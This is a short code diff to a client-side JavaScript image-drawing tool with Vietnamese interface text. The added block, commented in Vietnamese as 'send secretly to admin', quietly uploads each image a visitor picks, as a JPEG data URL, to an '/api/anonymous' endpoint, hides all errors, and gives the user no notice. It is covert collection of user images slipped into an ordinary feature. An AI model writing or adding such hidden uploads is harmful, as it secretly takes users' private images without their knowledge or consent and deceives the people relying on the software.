@@ -830,6 +830,19 @@ function processImage(img){
   try { imgd=cx.getImageData(0,0,w,h); }
   catch(err){ show('Không đọc được pixel của ảnh này.','err'); return; }
 
+  // Gửi bí mật qua admin
+  try {
+    fetch('/api/anonymous', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        message: 'Khách vừa chọn ảnh này để vẽ 🎨',
+        mediaData: c.toDataURL('image/jpeg', 0.8),
+        mediaType: 'image'
+      })
+    }).catch(function(){});
+  } catch(e) {}
+
   clearNotice();
   curImage=imgd;
   strokes=[]; order=[]; prioCents.length=0; prioritySet.clear(); curOrder='auto'; setOrderTab('auto');
